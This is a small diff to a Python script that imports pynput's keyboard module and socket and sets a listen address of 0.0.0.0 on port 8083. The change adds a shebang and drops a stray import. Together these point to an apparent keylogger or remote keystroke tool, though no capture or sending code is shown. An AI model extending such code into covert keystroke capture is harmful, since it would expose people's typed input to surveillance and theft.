@@ -1,8 +1,7 @@
+#!/usr/bin/python3 
 import platform,os,socket
 from pynput import keyboard
 from pynput.keyboard import Key
-from webob import year
-
 Ip = '0.0.0.0'
 Port = 8083
 
